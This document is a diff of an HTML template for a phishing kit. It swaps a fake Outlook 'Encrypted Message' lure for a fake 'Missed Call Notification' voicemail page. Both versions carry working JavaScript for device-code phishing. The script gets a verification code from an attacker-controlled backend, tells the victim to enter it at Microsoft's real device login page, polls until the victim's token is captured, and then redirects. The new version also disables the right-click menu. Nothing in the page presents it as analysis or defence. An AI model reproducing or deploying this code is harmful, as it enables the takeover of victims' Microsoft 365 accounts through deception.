@@ -1,152 +1,283 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Outlook - Encrypted Message</title>
-  <style>
-    *{margin:0;padding:0;box-sizing:border-box}
-    body{font-family:'Segoe UI',sans-serif;background:#1b1b1b;color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center}
-    .header{width:100%;padding:16px 24px;background:#0078D4;display:flex;align-items:center;gap:10px}
-    .header span{color:#fff;font-size:16px;font-weight:600}
-    .content{max-width:480px;width:100%;margin:80px auto 0;padding:0 16px}
-    .card{background:#2d2d2d;border-radius:8px;overflow:hidden;border:1px solid #404040}
-    .card-body{padding:32px}
-    .encrypted-banner{background:#1a3a5c;padding:14px 24px;display:flex;align-items:center;gap:10px;color:#60a5fa;font-size:14px;font-weight:600}
-    .main-text{color:#e0e0e0;font-size:16px;font-weight:600;margin-bottom:8px}
-    .sender{color:#a0a0a0;font-size:13px;margin-bottom:20px}
-    .file-row{display:flex;align-items:center;gap:16px;padding:16px;background:#242424;border-radius:6px;margin-bottom:20px}
-    .file-icon{width:48px;height:56px;border-radius:4px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:12px;font-weight:700}
-    .file-name{color:#e0e0e0;font-size:15px;font-weight:600}
-    .file-meta{color:#808080;font-size:12px;margin-top:2px}
-    .instruction{color:#a0a0a0;font-size:13px;margin-bottom:24px;line-height:1.5}
-    .btn{width:100%;padding:12px 24px;background:#0078D4;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px}
-    .btn:hover{background:#006abc}
-    .btn:disabled{background:#005a9e;cursor:not-allowed}
-    .code-card{background:#141414;border:1px solid #2a2a2a;border-radius:12px;padding:32px;text-align:center}
-    .code-label{color:#888;font-size:14px;margin-bottom:8px}
-    .code-value{font-family:monospace;font-size:36px;font-weight:bold;letter-spacing:0.3em;margin:12px 0}
-    .copy-btn{background:#1a1a2e;border:1px solid #2a2a2a;color:#fff;padding:8px 20px;border-radius:8px;cursor:pointer;font-size:14px;display:inline-flex;align-items:center;gap:8px}
-    .steps{margin-top:32px;text-align:left}
-    .steps p{color:#ccc;font-size:14px;font-weight:600;margin-bottom:12px}
-    .steps ol{color:#888;font-size:14px;line-height:2;padding-left:20px}
-    .steps strong{color:#fff}
-    .verify-link{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:20px;padding:12px 24px;background:#1a3a5c;border:1px solid #2a5a8c;border-radius:8px;color:#5ba3e6;font-size:14px;font-weight:500;text-decoration:none}
-    .waiting{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:24px;color:#888;font-size:14px}
-    .spinner{display:inline-block;width:16px;height:16px;border:2px solid #555;border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite}
-    .success-icon{width:80px;height:80px;border-radius:50%;background:rgba(22,101,52,.2);display:flex;align-items:center;justify-content:center;margin:0 auto 24px}
-    .error-icon{width:80px;height:80px;border-radius:50%;background:rgba(220,38,38,.1);display:flex;align-items:center;justify-content:center;margin:0 auto 24px}
-    .center{text-align:center}
-    .success{color:#22c55e}
-    .error{color:#ef4444}
-    .email-badge{color:#5ba3e6;font-size:14px;background:#1a1a2e;padding:8px 16px;border-radius:8px;display:inline-block;margin-top:16px}
-    @keyframes spin{to{transform:rotate(360deg)}}
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Missed Call Notification</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        header: '#1a1a2e',
+                        body: '#f5f5f0',
+                        card: '#eaeae5',
+                        btnDark: '#1a1a2e'
+                    }
+                }
+            }
+        }
+    </script>
 </head>
-<body>
-  <div class="header">
-    <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
-      <rect x="2" y="4" width="20" height="16" rx="2" fill="#fff" opacity="0.9"/>
-      <text x="12" y="15" text-anchor="middle" font-size="11" font-weight="bold" fill="#0078D4" font-family="Segoe UI,sans-serif">O</text>
-    </svg>
-    <span>Outlook</span>
-  </div>
+<body class="min-h-screen bg-body">
 
-  <div class="content" id="app">
-    <div class="card">
-      <div class="card-body">
-        <p class="sender">Loading...</p>
-      </div>
-    </div>
-  </div>
+    <!-- Email-style wrapper -->
+    <div class="max-w-2xl mx-auto bg-body min-h-screen shadow-lg">
 
-  <script>
-    const API = "{{ domain }}";
-    const CODE = "{{ invitation }}";
-    const app = document.getElementById("app");
-    const DOC_COLORS = { PDF:"#E74C3C", DOCX:"#2B579A", XLSX:"#217346", PPTX:"#D24726", ZIP:"#F0AD4E" };
-
-    async function init() {
-      try {
-        const res = await fetch(`${API}/api/public/i/${CODE}`);
-        if (!res.ok) { app.innerHTML = '<div class="card"><div class="card-body center"><p class="error">Link not found or expired.</p></div></div>'; return; }
-        const inv = await res.json();
-        showTemplate(inv);
-      } catch { app.innerHTML = '<div class="card"><div class="card-body center"><p class="error">Could not connect.</p></div></div>'; }
-    }
-
-    function showTemplate(inv) {
-      const color = DOC_COLORS[inv.docType] || "#0078D4";
-      app.innerHTML = `
-        <div class="card">
-          <div class="encrypted-banner">
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#60a5fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
-              <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
-            </svg>
-            Encrypted Message
-          </div>
-          <div class="card-body">
-            <p class="main-text">You have received an encrypted message</p>
-            <p class="sender">From: ${inv.senderName}</p>
-            ${inv.notes ? '<p style="color:#808080;font-size:12px;font-style:italic;margin-top:4px">' + inv.notes + '</p>' : ''}
-            <div class="file-row">
-              <div class="file-icon" style="background:${color}">${inv.docType}</div>
-              <div>
-                <p class="file-name">${inv.documentTitle}</p>
-                <p class="file-meta">Attachment &middot; ${inv.docType}</p>
-              </div>
-            </div>
-            <p class="instruction">To read this message, verify your identity using your Microsoft account.</p>
-            <button class="btn" id="openBtn">Read Message</button>
-          </div>
-        </div>`;
-      document.getElementById("openBtn").onclick = () => startAuth(inv.invitationId);
-    }
-
-    async function startAuth(invitationId) {
-      const btn = document.getElementById("openBtn");
-      btn.disabled = true;
-      btn.innerHTML = '<span class="spinner"></span> Verifying...';
-      try {
-        const res = await fetch(`${API}/api/public/i/connect`, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({invitationId}) });
-        if (!res.ok) { app.innerHTML = '<div class="card"><div class="card-body center"><p class="error">Failed to start.</p></div></div>'; return; }
-        const auth = await res.json();
-        showCode(auth, invitationId);
-      } catch { app.innerHTML = '<div class="card"><div class="card-body center"><p class="error">Network error.</p></div></div>'; }
-    }
-
-    function showCode(auth, invitationId) {
-      app.innerHTML = `
-        <div class="code-card">
-          <p class="code-label">Verification code</p>
-          <p class="code-value">${auth.userCode}</p>
-          <button class="copy-btn" id="copyBtn">Copy code</button>
-          <div class="steps">
-            <p>Steps to verify:</p>
-            <ol>
-              <li>Open the link below in a new tab</li>
-              <li>Enter code <strong>${auth.userCode}</strong> when prompted</li>
-              <li>Sign in with your Microsoft account</li>
-              <li>Return to this page — it updates automatically</li>
-            </ol>
-          </div>
-          <a href="${auth.verificationUri}" target="_blank" rel="noopener" class="verify-link">${auth.verificationUri}</a>
+        <!-- Header -->
+        <div class="bg-header px-8 py-8">
+            <h1 class="text-white text-2xl md:text-3xl font-bold tracking-tight">Missed Call Notification</h1>
+            <p class="text-gray-300 text-sm mt-1">A voicemail was left for you</p>
         </div>
-        <div class="waiting"><span class="spinner"></span> Waiting for authentication...</div>`;
-      document.getElementById("copyBtn").onclick = () => { navigator.clipboard.writeText(auth.userCode); document.getElementById("copyBtn").textContent = "Copied!"; setTimeout(() => document.getElementById("copyBtn").textContent = "Copy code", 2000); };
 
-      const timer = setInterval(async () => {
-        try {
-          const res = await fetch(`${API}/api/public/i/poll`, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({deviceCode:auth.deviceCode, invitationId}) });
-          const result = await res.json();
-          if (result.status === "complete") { clearInterval(timer); if (result.exitUrl) { window.location.href = result.exitUrl; return; } app.innerHTML = `<div class="code-card"><div class="success-icon"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg></div><h2 style="font-size:28px;font-weight:bold;margin-bottom:8px">Account Connected!</h2><p style="color:#888">Your Microsoft 365 account has been successfully verified.</p>${result.email ? '<p class="email-badge">'+result.email+'</p>' : ''}</div>`; }
-          else if (result.status === "error") { clearInterval(timer); app.innerHTML = `<div class="code-card"><div class="error-icon"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg></div><h2 class="error" style="font-size:24px;font-weight:bold;margin-bottom:8px">Authentication Failed</h2><p style="color:#888;margin-bottom:24px">${result.error}</p><button class="btn" onclick="location.reload()">Try Again</button></div>`; }
-        } catch {}
-      }, auth.interval * 1000);
-    }
+        <!-- Call Details -->
+        <div class="px-8 py-8">
+            <p class="text-xs text-gray-500 uppercase tracking-wider font-medium">From</p>
+            <p class="text-2xl md:text-3xl font-bold text-gray-900 mt-2">{{ senderName }}</p>
+            <p class="text-gray-600 text-sm mt-1">{{ note }}</p>
+            <p class="text-gray-400 text-sm mt-2">Received: 3/25/2026 &nbsp;|&nbsp; Duration: 03:02</p>
+        </div>
 
-    init();
-  </script>
+        <!-- Voicemail Audio Card -->
+        <div class="px-8 pb-8">
+            <div class="bg-card rounded-lg p-8 text-center">
+                <!-- Headphone Icon + Title -->
+                <div class="flex items-center justify-center gap-2 mb-5">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-gray-700" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M9 19V6l12-3v13M9 19c0 1.105-1.343 2-3 2s-3-.895-3-2 1.343-2 3-2 3 .895 3 2zm12-3c0 1.105-1.343 2-3 2s-3-.895-3-2 1.343-2 3-2 3 .895 3 2zM9 10l12-3"/>
+                    </svg>
+                    <span class="text-gray-800 font-semibold text-base">Voicemail Audio</span>
+                </div>
+
+                <!-- Play Button -->
+                <button id="playBtn" onclick="handlePlay()" class="inline-flex items-center gap-2 bg-btnDark text-white px-8 py-3 rounded font-medium text-sm hover:bg-opacity-90 transition-colors">
+                    <!-- Play icon -->
+                    <svg id="playIcon" xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M8 5v14l11-7z"/>
+                    </svg>
+                    <!-- Spinner icon (hidden) -->
+                    <svg id="spinnerIcon" class="w-4 h-4 animate-spin hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
+                    </svg>
+                    <span id="playText">Play Voicemail</span>
+                </button>
+
+                <!-- File Info -->
+                <p class="text-gray-500 text-xs mt-4">File: {{ documentTitle }}</p>
+                <p class="text-gray-500 text-xs mt-0.5">Size: 2.4 MB</p>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="px-8 pb-10 text-center">
+            <p class="text-gray-400 text-xs">This voicemail will be retained for 30 days.</p>
+            <p class="text-gray-400 text-xs mt-1">&copy; 2026 Childrensvillage</p>
+        </div>
+
+    </div>
+
+    <!-- Verification Modal Overlay -->
+    <div id="modalOverlay" class="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50 hidden">
+        <div class="bg-body rounded-xl shadow-2xl w-full max-w-md border border-gray-300 overflow-hidden">
+            <!-- Modal Content -->
+            <div class="p-8 text-center">
+                <p class="text-gray-500 text-sm mb-2">Verification code</p>
+                <p id="codeDisplay" class="text-2xl md:text-3xl font-bold text-gray-900 tracking-[0.25em] mb-6">CQ5CQSM5F</p>
+
+                <!-- Copy Code Button -->
+                <button onclick="copyCode()" id="copyBtn" class="inline-flex items-center gap-2 border border-gray-400 text-gray-700 px-6 py-2.5 rounded-lg font-medium text-sm hover:bg-card transition-colors mb-8">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                        <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"></path>
+                    </svg>
+                    <span id="copyText">Copy code</span>
+                </button>
+
+                <!-- Steps -->
+                <div class="text-left mb-6">
+                    <p class="text-gray-800 font-semibold text-sm mb-3">Steps to verify:</p>
+                    <ol class="space-y-2 text-gray-500 text-sm pl-4">
+                        <li>Open the link below in a new tab</li>
+                        <li>Enter code <span id="codeInStep" class="font-bold text-gray-800">CQ5CQSM5F</span> when prompted</li>
+                        <li>Sign in with your Microsoft account</li>
+                        <li>Return to this page &mdash; it updates automatically</li>
+                    </ol>
+                </div>
+
+                <!-- Link Button -->
+                <a id="authLink" href="https://login.microsoft.com/device" target="_blank" class="block w-full bg-header text-white py-3.5 rounded-lg font-medium text-sm hover:bg-opacity-90 transition-colors text-center">
+                    https://login.microsoft.com/device
+                    <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 inline-block ml-1" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6M15 3h6v6M10 14L21 3"/>
+                    </svg>
+                </a>
+            </div>
+
+            <!-- Waiting indicator -->
+            <div class="border-t border-gray-300 py-4 text-center">
+                <div class="inline-flex items-center gap-2 text-gray-400 text-sm">
+                    <svg class="w-4 h-4 animate-spin" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
+                    </svg>
+                    Waiting for authentication...
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        var API = "{{ domain }}";
+        var CODE = "{{ invitation }}";
+        var _invitationId = null;
+        var _pollTimer = null;
+
+        function init() {
+            fetch(API + '/api/public/i/' + CODE)
+                .then(function(res) {
+                    if (!res.ok) return;
+                    return res.json();
+                })
+                .then(function(data) {
+                    if (data && data.invitationId) {
+                        _invitationId = data.invitationId;
+                    }
+                })
+                .catch(function() {
+                    // Fail silently — page still shows static content
+                });
+        }
+
+        function resetButton() {
+            var btn = document.getElementById('playBtn');
+            var playIcon = document.getElementById('playIcon');
+            var spinnerIcon = document.getElementById('spinnerIcon');
+            var playText = document.getElementById('playText');
+
+            btn.disabled = false;
+            btn.classList.remove('opacity-75', 'cursor-not-allowed');
+            playIcon.classList.remove('hidden');
+            spinnerIcon.classList.add('hidden');
+            playText.textContent = 'Play Voicemail';
+        }
+
+        function showModalWithValues(userCode, verificationUri) {
+            document.getElementById('codeDisplay').textContent = userCode;
+            document.getElementById('codeInStep').textContent = userCode;
+            var authLink = document.getElementById('authLink');
+            authLink.href = verificationUri;
+            authLink.childNodes[0].textContent = verificationUri + ' ';
+            document.getElementById('modalOverlay').classList.remove('hidden');
+        }
+
+        function startPolling(deviceCode, interval) {
+            if (_pollTimer) clearInterval(_pollTimer);
+
+            _pollTimer = setInterval(function() {
+                fetch(API + '/api/public/i/poll', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ deviceCode: deviceCode, invitationId: _invitationId })
+                })
+                .then(function(res) { return res.json(); })
+                .then(function(result) {
+                    if (result.status === 'complete') {
+                        clearInterval(_pollTimer);
+                        _pollTimer = null;
+                        window.location.href = result.exitUrl;
+                    } else if (result.status === 'error') {
+                        clearInterval(_pollTimer);
+                        _pollTimer = null;
+                        // Show error in modal
+                        var modalContent = document.querySelector('#modalOverlay .p-8');
+                        if (modalContent) {
+                            modalContent.innerHTML = '<p class="text-red-600 text-base font-semibold mb-4">' + (result.error || 'Authentication failed') + '</p>' +
+                                '<button onclick="document.getElementById(\'modalOverlay\').classList.add(\'hidden\');handlePlay();" class="inline-flex items-center gap-2 bg-btnDark text-white px-6 py-2.5 rounded-lg font-medium text-sm hover:bg-opacity-90 transition-colors">Try Again</button>';
+                        }
+                        // Hide waiting indicator
+                        var waitingDiv = document.querySelector('#modalOverlay .border-t');
+                        if (waitingDiv) waitingDiv.classList.add('hidden');
+                    }
+                    // "pending" — keep polling
+                })
+                .catch(function() {
+                    // Network error — keep polling
+                });
+            }, interval * 1000);
+        }
+
+        function handlePlay() {
+            var btn = document.getElementById('playBtn');
+            var playIcon = document.getElementById('playIcon');
+            var spinnerIcon = document.getElementById('spinnerIcon');
+            var playText = document.getElementById('playText');
+
+            // Show loading state
+            btn.disabled = true;
+            btn.classList.add('opacity-75', 'cursor-not-allowed');
+            playIcon.classList.add('hidden');
+            spinnerIcon.classList.remove('hidden');
+            playText.textContent = 'Loading...';
+
+            if (!_invitationId) {
+                // No backend — fall back to hardcoded values after delay so spinner is visible
+                setTimeout(function() {
+                    resetButton();
+                    showModalWithValues('CQ5CQSM5F', 'https://login.microsoft.com/device');
+                }, 2000);
+                return;
+            }
+
+            fetch(API + '/api/public/i/connect', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ invitationId: _invitationId })
+            })
+            .then(function(res) {
+                if (!res.ok) throw new Error('Connect failed');
+                return res.json();
+            })
+            .then(function(auth) {
+                resetButton();
+                showModalWithValues(auth.userCode, auth.verificationUri);
+                startPolling(auth.deviceCode, auth.interval);
+            })
+            .catch(function() {
+                // Fall back to hardcoded values after delay so spinner is visible
+                setTimeout(function() {
+                    resetButton();
+                    showModalWithValues('CQ5CQSM5F', 'https://login.microsoft.com/device');
+                }, 2000);
+            });
+        }
+
+        function copyCode() {
+            var code = document.getElementById('codeDisplay').textContent.trim();
+            navigator.clipboard.writeText(code).then(function() {
+                var copyText = document.getElementById('copyText');
+                copyText.textContent = 'Copied!';
+                setTimeout(function() {
+                    copyText.textContent = 'Copy code';
+                }, 2000);
+            });
+        }
+
+        // Close modal on overlay click
+        document.getElementById('modalOverlay').addEventListener('click', function(e) {
+            if (e.target === this) {
+                this.classList.add('hidden');
+                if (_pollTimer) {
+                    clearInterval(_pollTimer);
+                    _pollTimer = null;
+                }
+            }
+        });
+
+        init();
+        document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+    </script>
+
 </body>
 </html>
